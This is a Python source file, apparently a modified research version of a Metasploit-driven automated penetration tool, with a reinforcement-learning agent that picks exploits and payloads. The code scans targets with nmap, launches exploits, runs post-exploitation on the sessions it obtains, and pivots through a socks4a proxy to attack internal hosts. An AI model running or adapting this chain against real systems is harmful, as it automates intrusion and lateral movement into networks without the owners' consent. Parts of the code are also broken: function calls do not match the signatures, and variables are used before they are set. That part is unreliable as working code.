      #  print(probs)
        index = probs[0].multinomial(num_samples=1).unsqueeze(0) # 1 x batch x indx
        return scores, index, value, self.label_list, self.state_value

    def reset_hidden(self, batch_size):
        self.state_hidden = torch.zeros(1, batch_size, self.hidden_size, device=device)

                                         
    
        



class NeuralAgent:
    """ Simple Neural Agent for playing TextWorld games. """
    MAX_VOCAB_SIZE = 10000
    UPDATE_FREQUENCY = 10
    LOG_FREQUENCY = 100
    GAMMA = 0.9
 #   device = 'cpu'
    
    def __init__(self) -> None:
        self._initialized = False
        self._epsiode_has_started = False
        self.id2word = ["<PAD>", "<UNK>"]
        self.word2id = {w: i for i, w in enumerate(self.id2word)}
        
        self.model = CommandScorer(input_size=self.MAX_VOCAB_SIZE, hidden_size=512)
        self.optimizer = optim.Adam(self.model.parameters(), 0.0005)
        
        self.mode = "train"
        self.stats = {"max": defaultdict(list), "mean": defaultdict(list)}
        self.transitions = []
        self.model.reset_hidden(1)
        self.last_score = 0
        self.no_train_step = 0
    
    def train(self):
        self.mode = "train"
        self.stats = {"max": defaultdict(list), "mean": defaultdict(list)}
        self.transitions = []
        self.model.reset_hidden(1)
        self.last_score = 0
        self.no_train_step = 0
    
    def test(self):
        self.mode = "test"
        self.model.reset_hidden(1)
        
  #  @property
  #  def infos_to_request(self) -> EnvInfos:
     #   return EnvInfos(description=True, inventory=True,objective=True,entities=True,location=True, admissible_commands=True,
               #         won=True, lost=True)
    
    def _get_word_id(self, word):
        if word not in self.word2id:
            if len(self.word2id) >= self.MAX_VOCAB_SIZE:
                return self.word2id["<UNK>"]
            
            self.id2word.append(word)
            self.word2id[word] = len(self.word2id)
            
        return self.word2id[word]
            
    def _tokenize(self, text):
        # Simple tokenizer: strip out all non-alphabetic characters.
      #  print(text)
        text = text.replace('\\r', ' ')
        text = text.replace('\\n', ' ')
       # print(text)
        text = re.sub("[^a-zA-Z0-9\-\/\.\_  ]", " ", text)
      #  print(text)
        word_ids = list(map(self._get_word_id, text.split()))
       # print(word_ids)
        return word_ids
    
  

    def _process(self, texts):
        texts = list(map(self._tokenize, texts))
      #  print(texts)
        max_len = 200
        padded = np.ones((len(texts), max_len)) * self.word2id["<PAD>"]

        for i, text in enumerate(texts):
            padded[i, :len(text)] = text

        padded_tensor = torch.from_numpy(padded).type(torch.long).to(device)
        padded_tensor = padded_tensor.permute(1, 0) # Batch x Seq => Seq x Batch
        return padded_tensor
    
    
    def _process_act(self, texts):
        texts = list(map(self._tokenize, texts))
      #  print(texts)
        max_len = max(len(l) for l in texts)
        padded = np.ones((len(texts), max_len)) * self.word2id["<PAD>"]

        for i, text in enumerate(texts):
            padded[i, :len(text)] = text

        padded_tensor = torch.from_numpy(padded).type(torch.long).to(device)
        padded_tensor = padded_tensor.permute(1, 0) # Batch x Seq => Seq x Batch
        return padded_tensor
      
    def _discount_rewards(self, last_values):
        returns, advantages = [], []
        R = last_values.data
        for t in reversed(range(len(self.transitions))):
            rewards, _, _, values = self.transitions[t]
            R = rewards + self.GAMMA * R
            adv = R - values
            returns.append(R)
            advantages.append(adv)
            
        return returns[::-1], advantages[::-1]

    def act(self, obs: str, score: int, done: bool, actions: Mapping[str, Any]) -> Optional[str]:
        global policy
        global value
        global entropy
        
        
        
      #  tokenizer = AutoTokenizer.from_pretrained("jackaduma/SecRoBERTa")
        
        policy,value,entropy = [], [], []
      #  print(score)
       # f = open('rewardredchefEX5.txt', 'a', encoding='UTF-8') 
     #   f.write(str(score)+'\n')
       # f.close()
 
      #  print(len(actions))
        # Build agent's observation: feedback + look + inventory.
      #  print(actions)
      #  obs = str(obs)
     #   print(obs)
        
        input_ = "{}".format(obs)
      #  input_tensor = tokenizer([input_], return_tensors="pt", max_length=500, padding='max_length', truncation=True)
     #   print(actions)
       # input_ = obs
      #  print(input_)
     #   print(input_)
        # Tokenize and pad the input and the commands to chose from.
        input_tensor = self._process([input_])
        
        if len(actions) == 0:
            actions = 'no payload'
        
        commands_tensor = self._process_act(actions)
        
        # Get our next action and value prediction.
        outputs, indexes, values, label_list, state_list = self.model(input_tensor, commands_tensor)
      #  if len(actions) == 0:
        #   action = 'no payload'
           
      #  else:
        action = actions[indexes[0]]
      #  f = open('actionredchefEX5.txt', 'a', encoding='UTF-8') 
     #   f.write(str(action)+'\n')
       # f.close()
        
        if self.mode == "test":
            if done:
                self.model.reset_hidden(1)
            return action
        
        self.no_train_step += 1
      #  print(self.no_train_step)
        
        if self.transitions:
            reward = score - self.last_score  # Reward is the gain/loss in score.
           # print(reward)
          #  print(reward)
            self.last_score = score
           # if infos["won"]:
              #  reward += 30
          #  if infos["lost"]:
              #  reward -= 10
            #print (self.transition[-1][0])  
            self.transitions[-1][0] = reward  # Update reward information.
          #  print(reward)
        
        self.stats["max"]["score"].append(score)
        if self.no_train_step % self.UPDATE_FREQUENCY == 0:
            # Update model
            returns, advantages = self._discount_rewards(values)
            
            loss = 0
            for transition, ret, advantage in zip(self.transitions, returns, advantages):
                reward, indexes_, outputs_, values_ = transition
               
              #  with open('reward.txt', 'a') as f:
             #       f.write(str(reward)+'\n')
              #  f.close()
                
                advantage        = advantage.detach() # Block gradients flow here.
                probs            = F.softmax(outputs_, dim=2)
                log_probs        = torch.log(probs)
                log_action_probs = log_probs.gather(2, indexes_)
                policy_loss      = (-log_action_probs * advantage).sum()
                value_loss       = (.5 * (values_ - ret) ** 2.).sum()
                entropy     = (-probs * log_probs).sum()
                loss += policy_loss + 0.5 * value_loss - 0.1 * entropy
             #   print(loss)
                self.stats["mean"]["reward"].append(reward)
               
              #  print(self.stats["mean"]["reward"])
                self.stats["mean"]["policy"].append(policy_loss.item())
                #policy.append(self.stats["mean"]["policy"])
                self.stats["mean"]["value"].append(value_loss.item())
                #value.append(value_loss.item())
                self.stats["mean"]["entropy"].append(entropy.item())
                #entropy.append(entropy.item())
                self.stats["mean"]["confidence"].append(torch.exp(log_action_probs).item())
                #print(self.stats["mean"])
                #print(policy)
                
                
        
            
            if self.no_train_step % self.LOG_FREQUENCY == 0:
                msg = "{}. ".format(self.no_train_step)
                msg += "  ".join("{}: {:.3f}".format(k, np.mean(v)) for k, v in self.stats["mean"].items())
                msg += "  " + "  ".join("{}: {}".format(k, np.max(v)) for k, v in self.stats["max"].items())
                msg += "  vocab: {}".format(len(self.id2word))
                print("\n"+msg)
#                print(probs)
#                print(log_probs)
#                print(log_action_probs)
                self.stats = {"max": defaultdict(list), "mean": defaultdict(list)}
            
            loss.backward()
            nn.utils.clip_grad_norm_(self.model.parameters(), 40)
            self.optimizer.step()
            self.optimizer.zero_grad()
        
            self.transitions = []
            self.model.reset_hidden(1)
        else:
            # Keep information about transitions for Truncated Backpropagation Through Time.
            self.transitions.append([None, indexes, outputs, values])  # Reward will be set on the next call
        
        if done:
            self.last_score = 0  # Will be starting a new episode. Reset the last score.
            self.model.reset_hidden(1) # 追加
        
        return action, label_list, state_list
  
 







# Environment.
class Environment:
    total_reward_vec = np.zeros(10)
    count_trial_each_thread = 0

    def __init__(self, name, thread_type, rhost):
        self.name = name
        self.thread_type = thread_type
        self.env = Metasploit(rhost)
        self.agent = NeuralAgent()
        self.util = Utilty()
        self.act_list = []
        self.step_count = 0

    def run(self, exploit_tree, target_tree):
      #  self.agent.brain.pull_parameter_server()  # Copy ParameterSever weight to LocalBrain
        global frames              # Total number of trial in total session.
        global isFinish            # Finishing of learning/testing flag.
        global exploit_count       # Number of successful exploitation.
        global post_exploit_count  # Number of successful post-exploitation.
        global plot_count          # Exploitation count list for plot.
        global plot_pcount         # Post-exploit count list for plot.

        if self.thread_type == 'test':
            # Execute exploitation.
            self.util.print_message(NOTE, 'Execute exploitation.')
            session_list = []
            for port_num in com_port_list:
                execute_list = []
                target_info = {}
                module_list = target_tree[port_num]['exploit']
                for exploit in module_list:
                    target_list = exploit_tree[exploit[8:]]['target_list']
                    for target in target_list:
                        skip_flag, s, payload_list, target_info = self.env.get_state(exploit_tree,
                                                                                     target_tree,
                                                                                     port_num,
                                                                                     exploit,
                                                                                     target)
                        if skip_flag is False:
                            # Get available payload index.
                            available_actions, available_actions_list = self.env.get_available_actions(payload_list)

                            # Decide action using epsilon greedy.
                            frames = self.env.eps_steps
                            _, _, p_list = self.agent.act(s, available_actions, self.env.eps_steps)
                            # Append all payload probabilities.
                            if p_list is not None:
                                for prob in p_list:
                                    execute_list.append([prob[1], exploit, target, prob[0], target_info])
                        else:
                            continue

                # Execute action.
                execute_list.sort(key=lambda s: -s[0])
                for idx, exe_info in enumerate(execute_list):
                    # Execute exploit.
                    _, _, done, sess_info = self.env.execute_exploit(exe_info[3],
                                                                     self.name,
                                                                     self.thread_type,
                                                                     exe_info[2],
                                                                     exe_info[4],
                                                                     idx,
                                                                     exploit_tree)

                    # Store session information.
                    if len(sess_info) != 0:
                        session_list.append(sess_info)

                    # Change port number for next exploitation.
                    if done is True:
                        break

            # Execute post exploitation.
            new_target_list = []
            for session in session_list:
                self.util.print_message(NOTE, 'Execute post exploitation.')
                self.util.print_message(OK, 'Target session info.\n'
                                            '    session id   : {0}\n'
                                            '    session type : {1}\n'
                                            '    target port  : {2}\n'
                                            '    exploit      : {3}\n'
                                            '    target       : {4}\n'
                                            '    payload      : {5}'.format(session['id'],
                                                                            session['type'],
                                                                            session['port'],
                                                                            session['exploit'],
                                                                            session['target'],
                                                                            session['payload']))
                internal_ip_list = self.env.execute_post_exploit(session['id'], session['type'])
                for ip_addr in internal_ip_list:
                    if ip_addr not in self.env.prohibited_list and ip_addr != self.env.rhost:
                        new_target_list.append(ip_addr)
                    else:
                        self.util.print_message(WARNING, 'Target IP={} is prohibited.'.format(ip_addr))

            # Deep penetration.
            new_target_list = list(set(new_target_list))
            if len(new_target_list) != 0:
                # Launch Socks4a proxy.
                module = 'auxiliary/server/socks4a'
                self.util.print_message(NOTE, 'Set proxychains: SRVHOST={}, SRVPORT={}'.format(self.env.proxy_host,
                                                                                               str(self.env.proxy_port)))
                option = {'SRVHOST': self.env.proxy_host, 'SRVPORT': self.env.proxy_port}
                job_id, uuid = self.env.client.execute_module('auxiliary', module, option)
                if uuid is None:
                    self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
                    isFinish = True
                    return

                # Further penetration.
                self.env.source_host = self.env.rhost
                self.env.prohibited_list.append(self.env.rhost)
                self.env.isPostExploit = True
                self.deep_run(new_target_list)

            isFinish = True
        else:
            # Execute learning.
        #    skip_flag, s, payload_list, target_list, target_info = self.env.reset_state(exploit_tree, target_tree)
            skip_flag, s, a = self.env.reset_state2(exploit_tree, target_tree)
          #  print(s2)  
            # If product name is 'unknown', skip.
            if skip_flag is False:
                R = 0
                step = 0
                r = 0
                done = 'false'
                count = 0
                while True:
                    self.step_count += 1
                    print('!!!!!'+ str(self.step_count))
                    # Decide action (randomly or epsilon greedy).
                    
                  #  available_actions, available_actions_list = self.env.get_available_actions(payload_list)
                 #   a = self.agent.act(s, r, done, available_actions_list)
                   # print(available_actions)
                  
                    if count == 3:
                       self.act_list = []
                       count += 1 
                     #  print(a)
                       available_actions, a = self.env.get_available_actions(a)
                    #   print(available_actions_list)
                       a,label_list, encoder_list = self.agent.act(s, r, done, a)
                       s, r, done, _ = self.env.execute_exploit(s,a,
                                                              self.name,
                                                              self.thread_type,
                                                              target_list,
                                                              target_info,
                                                              step,
                                                              exploit_tree,
                                                              frames)
                     #  print(done)                                       
                   #    print('reward;'+ str(r))                                     
                    
                         
                         
                                                              
                    else:
                         count += 1
                       #  print(s)
                       #  print(a)
                         a, label_list, encoder_list = self.agent.act(s, r, done, a)
                         s, a, r, done, target_info = self.env.step(s, a, exploit_tree, target_tree)
                         if count == 2:
                            target_list = a
                      #   print(a_list)
                         
                  #  print(s)
                #    print(a)
                   # print(s)
                    # Execute action.
                 #   s_, r, done, _ = self.env.execute_exploit(a,
                                                            #  self.name,
                                                           #   self.thread_type,
                                                             # target_list,
                                                           #   target_info,
                                                             # step,
                                                           #   exploit_tree,
                                                             # frames)
                    
                   # print(r) 
                    print('count' + str(count))             
                    step += 1
                    print('step' + str(step)) 
                 #   print(s_2)
                    # Update payload list according to new target.
                 #   payload_list = exploit_tree[target_info['exploit']]['targets'][str(self.env.state[ST_TARGET])]

                    # If trial exceed maximum number of trials at current episode,
                    # finish trial at current episode.
                    if step == 4:
                        done = True
                    print(done)
                    # Increment frame number.
                    frames += 1

                    # Increment number of successful exploitation.
                    if r == R_GOOD:
                        exploit_count += 1

                    # Increment number of successful post-exploitation.
                    if r == R_GREAT:
                        exploit_count += 1
                        post_exploit_count += 1

                    # Plot number of successful post-exploitation each 100 frames.
                    if frames % 100 == 0:
                        self.util.print_message(NOTE, 'Plot number of successful post-exploitation.')
                        plot_count.append(exploit_count)
                        plot_pcount.append(post_exploit_count)
                        exploit_count = 0
                        post_exploit_count = 0

                    # Push reward and experience considering advantage.to LocalBrain.
                    if a == 'no payload':
                        a = len(com_payload_list) - 1
                 #   self.agent.advantage_push_local_brain(s, a, r, s_)

                  #  s = s_
                   # s2 = s_2
                    R += r
                    # Copy updating ParameterServer weight each Tmax.
                  #  if done or (step % Tmax == 0):
                      #  if not (isFinish):
                        #    self.agent.brain.update_parameter_server()
                        #    self.agent.brain.pull_parameter_server()

                    if done:
                        # Discard the old total reward and keep the latest 10 pieces.
                        self.total_reward_vec = np.hstack((self.total_reward_vec[1:], step))
                        # Increment total trial number of thread.
                        self.count_trial_each_thread += 1
                        print(a)
                        self.act_list.append(a)
                      #  print(a_2)
                        self.agent.act(s, r, done, self.act_list)
                        
                        break

                # Output total number of trials, thread name, current reward to console.
             #   self.util.print_message(OK, 'Thread: {}, Trial num: {}, '
                                       #     'Step: {}, Avg step: {}'.format(self.name,
                                                                        #    str(self.count_trial_each_thread),
                                                                       #     str(step),
                                                                        #    str(self.total_reward_vec.mean())))

                # End of learning.
                    if self.step_count >= MAX_TRAIN_NUM:
                   # dim2list = [[label_list[i], encoder_list[i]] for i in range(len(label_list))]
                 #   df = pd.DataFrame(dim2list, columns=['feature', 'label'])
                       output1 = np.stack(encoder_list, 0)
                       print(output1.shape)
                       output1 = output1.squeeze()
                       print(output1.shape)
                 #   output1 = output1.to('cpu').detach().numpy().copy()
                       encoder_hidden2d = TSNE(n_components=2).fit_transform(output1)
                       plt.figure(figsize=(13, 7))
                       plt.scatter(encoder_hidden2d[:,0], encoder_hidden2d[:,1],c=label_list, cmap='jet',s=15, alpha=0.5)
                       plt.axis('off')
                       plt.colorbar()
                       plt.savefig("redchefgtrxlTSNE.png")
                       plt.show()
                    
                       self.util.print_message(OK, 'Finish train:{}'.format(self.name))
                       isFinish = True
                       self.util.print_message(OK, 'Stopping learning...')
                       break
                 #   time.sleep(30.0)
                    # Push params of thread to ParameterServer.
                 #   self.agent.brain.push_parameter_server()

    # Further penetration.
    def deep_run(self, target_ip_list):
        for target_ip in target_ip_list:
            result_file = 'nmap_result_' + target_ip + '.xml'
            command = self.env.nmap_2nd_command + ' ' + result_file + ' ' + target_ip + '\n'
            self.env.execute_nmap(target_ip, command, self.env.nmap_2nd_timeout)
            com_port_list, proto_list, info_list = self.env.get_port_list(result_file, target_ip)

            # Get exploit tree and target info.
            exploit_tree = self.env.get_exploit_tree()
            target_tree = self.env.get_target_info(target_ip, proto_list, info_list)

            # Execute exploitation.
            self.env.rhost = target_ip
            self.run(exploit_tree, target_tree)


# WorkerThread
class Worker_thread:
    def __init__(self, thread_name, thread_type, rhost):
        self.environment = Environment(thread_name, thread_type, rhost)
        self.thread_name = thread_name
        self.thread_type = thread_type
        self.util = Utilty()

    # Execute learning or testing.
    def run(self, exploit_tree, target_tree, saver=None, train_path=None):
        self.util.print_message(NOTE, 'Executing start: {}'.format(self.thread_name))
        while True:
            if self.thread_type == 'learning':
                # Execute learning thread.
                self.environment.run(exploit_tree, target_tree)

                # Stop learning thread.
                if isFinish:
                    self.util.print_message(OK, 'Finish train: {}'.format(self.thread_name))
                  #  time.sleep(3.0)

                    # Finally save learned weights.
                   # self.util.print_message(OK, 'Save learned data: {}'.format(self.thread_name))
                  #  saver.save(SESS, train_path)

                    # Disconnection RPC Server.
                    self.environment.env.client.termination(self.environment.env.client.console_id)

                    if self.thread_name == 'local_thread1':
                        # Create plot.
                        df_plot = pd.DataFrame({'exploitation': plot_count,
                                                'post-exploitation': plot_pcount})
                        df_plot.to_csv(os.path.join(self.environment.env.data_path, 'experiment.csv'))
                        # df_plot.plot(kind='line', title='Training result.', legend=True)
                        # plt.savefig(self.environment.env.plot_file)
                        # plt.close('all')

                        # Create report.
                        report = CreateReport()
                        report.create_report('train', pd.to_datetime(self.environment.env.scan_start_time))
                    break
            else:
                # Execute testing thread.
                self.environment.run(exploit_tree, target_tree)

                # Stop testing thread.
                if isFinish:
                    self.util.print_message(OK, 'Finish test.')
                    time.sleep(3.0)

                    # Disconnection RPC Server.
                    self.environment.env.client.termination(self.environment.env.client.console_id)

                    # Create report.
                    report = CreateReport()
                    report.create_report('test', pd.to_datetime(self.environment.env.scan_start_time))
                    break



# Show initial banner.
def show_banner(util, delay_time=2.0):
    banner = u"""
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 ■■■■   ■■■■■  ■■■■■    ■■■■  ■■  ■■■  ■■■■■  ■■■■■ 
 ■■  ■  ■■  ■  ■■  ■■  ■   ■  ■■   ■   ■■  ■  ■■  ■ 
 ■■  ■  ■■     ■■   ■  ■      ■■   ■   ■■     ■■    
 ■■  ■  ■■■■   ■■   ■  ■      ■■■■■■   ■■■■   ■■■■  
 ■■■■   ■■     ■■   ■  ■      ■■   ■   ■■     ■■    
 ■■ ■   ■■     ■■   ■  ■      ■■   ■   ■■     ■■    
 ■■  ■  ■■     ■■  ■■  ■■     ■■   ■   ■■     ■■    
 ■■  ■■ ■■■■■  ■■■■■    ■■■■  ■■  ■■■  ■■■■■  ■■  
 
 
 
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMB777777777777777777777777MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMY77<?77<77777777~.....`............`.```````.``.`.?77?TMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMB<<<!........`.`.`.`......`.```````````````.`.....----___--..```.`....`. ?<<??MMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM=?<_......~_(((+((____-...``````.````.``.`..........~~~~~::::::~~~~__-.````.```````.``.`_????HMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMME<<~...........~~::<?????<<<__~~.~...................~~~~~~~~~~~:~:::::::~~~.....`.`.`.`.`.``.``..`. <?MMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMB><!._~..........~~~~~~::<>??==??;;::~~~~~~..............~~~~~~~~~~~~~:::::::::~~~~~..................._____-?MMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMM=<__~~~~~~........~~~~~~~~~~:;<?==???>;;;:::~~~~~~~~...~.~~~...~..~.~~~~:::;;;:::::~~~~~............~~~~::::::~~~_?MMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMM$~~~~~~~~~~~~....~.~~~~~~~~~~~~:::;+?=l=?>>>;;::::::~~~~~~~~~~~~~~~.~..~.~~:;;;;;::::::::~~~~~~......~~~~~:::::~~~~~~~__dMMMMMMMMMM
MMMMMMMMMMMMMMMMM5~~~~~~~~~~~~~~.~~~.~~~~~~~~~~~~~~:::;>?llz??>>;;;;::::::::::~~~~~~~~~~~~~~~:;>>>;;;:::::::::~:~~~~~~~~~::::::~~~~~~~~~~~~_dMMMMMMMMM
MMMMMMMMMMMMMMM#_(:::::~~~~:~~~~~~~~~~~~~~~~~~~~:~~~:::;?=ltz??>;;;;;;;;::::::::::~~:~~~~~~~:;>>;;:::::::::::::::::::::::::::~~:~~~~~~~~~~:__dMMMMMMMM
MMMMMMMMMMMMMMM5(;<?><::::::::::~:~~:~~~~~~~~:~:~:~~:::;>?=tOz?>>>;;;;;;;;;;;:::::::::::~:::++<;;:::::::::::::::::;:;;:::~~~~:~~:~~:~~~~~:::_dMMMMMMMM
MMMMMMMMMMMMM#5(>><;<><::;::;:::;::;:::::::::::~::~:~::;>?=zvO??>>;>;;;;;;;;;;;;;;;::::::::<+<;:::::::::::::;;;;;;;;::::~::~:~:~~::~:~:::::<(dMMMMMMMM
MMMMMMMMMMMMM5(??>>><;<<<;;;;;;;;;;;;;;;;;;;::::::::::::;>?zOXO=?????????????????>??>>>>>>+zz>;:::::::;;;;;;>;;;>;;:::::::~:::::::::::::::<+dMMMMMMMMM
MMMMMMMMMMMN<(??>?>>>??++((_::~:::;;;;;;;>;>>>>>;;><<<++++1zzVOvz11111111111111111111<<<<+zCz??+++++?+?>?????>?>>>;;:::::::::::::::::::::~(dMMMMMMMMMM
MMMMMMMMMMMN>;>>;;>;;;>>>>??=?z++<<:;;;>>>????==zzzllzz<<<<<:::~:~~:~~~:~~~~~~~~~~~~~~~~~~~.~~~_~<<<+1zllllzl==??>;;:::::::;;:;;;:::::~~(gMMMMMMMMMMMM
MMMMMMMMMMMNge<:<:;::::;:;;;>>??=llzz++1=1=lllOz11<<<:::~:~~~~~~~~~~~~.~..~........................~~~~~<<+1zOllz11?>;;;;;;;;::::~:~~(g&MMMMMMMMMMMMMM
MMMMMMMMMMMMMMMNgge__(~~:::::<;;<?=lwuXOz11??>>>;;::::~~~~~~~.....................`..`.````.```.......~~~~:::;;<<+zlzz1?>>;;::~:~_(ggMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMNgg-__~~:::+zOz1?>>>>>>;;;:::~~~~~~~........``````````````````````.`````````......~~~~::::;;;;+1tOz;::~~_-jMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMNge-_~<<;>>>>>>;;;;:::~~~~~~~..~.....``.```````````````````````````.``````.....~~~~~::::;;;<<<<--(gMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMME_:;;;;;;;;;;:::~~~~~~~..~.........`..`.`.`.``.``.`.`.``.``.``.``.`.`.`.....~~~~~::::;;;:<(MMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM# ~::;;;;;;;::::~:~~~~~~.~..........`...`..`..`..`..`.`..``.`.```.`...`.....~~~~~~:::::;;::_JMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM#^_~:;;;;;;;::::~~~~~~~~~~.~~.~..............`.....`..`.`.`..`...`.`.`.......~~~~~~:~:::::::_JMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM# ~~::;;;;;::::~:~~:~~~~~~~.~~.~...........................................~~.~~~~~::::::;::~_JMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM# ~:::;;::::::::~::~~~~~__--(((((((((((++++++&&&&&&&&&&+++++(((((----____~~~~~~~~~~~:::::::::_JMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM# ~~::::;:::::::(((+uswXkWWffWWWWUUUUUUUU0000000UUUUUUUUUUUUUUUWWWWffWWkkAs&&+--(_:::::::;;::_JMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMM# ~~:::;<:+(+ewXWpWWWUUUUzwwAQQmAA&z+<<<<<<<<<<<<<<<<+++111zuwQQQmAAwOOOwVVUUUUXWHma+-::;;:::_JMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMN,~~:~((ggMMM8VZOOOvzzQQNMMMNNNNNNNNR<~:::::::::::::::::<+dMNNNNNMNMMNNme++???11zWMNNMNa+::::(jMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM# ~(jdM###MSz1<><<<jWMMMMMMNMMMMNNM@>.~..~...~..~..~~~~~(MMNMMMMMMMMMMMMNz:;;;;;+WM##HHMR<~(jMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN(JXMHHH#MI<;;:::~?TMMH9Y=<<<<<<<!_....................._<<<<<<<?7TTMMMB>~~~::::vMN##HMR+JJMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#XHHHH#M>::~~~~~~~.~....._-................................._.......~.~~~~~~~:<W####MWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#WHHH#H>:~~~~~~.~.___~<+++(~~-...`.`.``.```.```.`..`..--~<++++<<~__.~.~~~~~~~<dM##MMXMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM6~dMHH#R<:~~~~~.~_~`-JXYWM#MHe-__-.`..`.....`...`.`..._~(JXYWMHMmx-_~_~..~~~~::dM##MC?TMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM5_~(W##MR<:~~~..___`(dN> .dN#HMH; __.`..`.`.`.`.`..`.-_ (H#< .dN#HMH-`_~~~.~~~~:dMNN#>~:JMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#><~_dMNNR<~~~~~~__`.dM#NmN#N#MMHk_ _.`.`.`.`..`..`..._ .W##NmMNNNMHHk_` ~~~~~~::dMMMD~_<JMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#><_~dMMNR<:~~~.~_``(dHH#NN#NNMMWS:  ..`..`..`..`.``.. `(H##NNN#NNMHW0~``_~.~~~~<dMMMC~(;JMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#+;<_<MMMK<:~~~.~_`` ?MMMM#NMMBOwC` `...`..`..`..`..`.`  OMMMMNNMM9OX> `..~~.~~:<dMM#<~;;JMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#;;_~dMMH<:~~~~._ `` ?WHWUU01+v>`````.`.`..`.`.`..`.. `  ?WHWUUC1jv! `. .~~~~~:<MMM3~:;;JMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM#;;;:<vT6<:~~~~~.~~.- .~?77C<!`   ...`...`..`...`..`..`    ??77C<!_ ..~.~.~~~~:;zTz<:;;jgMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNp;;::???>::~~~.~..~...................`..`...`...`..`...............~.~.~~~~~:>?=>;;;;jMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM@;;;;>=?>;:~~~~.~.~..~............`................................~.~~.~~~~:;+??>;;>+jMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN+>>;>???;::~~~~.~.~~.~.~...........................`.`..`........~..~.~~~~~:;???>;>>jMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMb;>>>?=?>::~~~.~..~...~..~.........~~~~~..`...~~~~....`.........~.~~.~.~~~::>?=?>>>jNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNm+>?==?>;:~~~~~~..~..............~(:__~~~.~~~~_:_...............~..~~~~~~:;??=???+jMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMR&a&z=?>;:~~~~~~.~~.~~.~..~.....~(>++<<(((+<<+><_.............~.~.~~~~~:;>?=<u&gNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMI=?>;::~~~~.~.~.~..~...._--(((+uzzzzzzzzu&&---..-........~.~~~~~~~::;???uMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMmz??>;::~~~~~.~..~._(J&QWWkqqmg@@@MMMMM@H@MgqqHkkA&--...~.~~.~~~~~:;+?=?MMMMMMMMMMMM8?<+11zMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNI=??;;::~~~~~.~~(JqHgmqkkkbbkkkqHHHHHHHHkkbbbkkkqqmHm&-.~~.~~~~~:;>???uMMMMMMMB1<:((+zzzz++<<vMMMMMMMMMMMMMMM
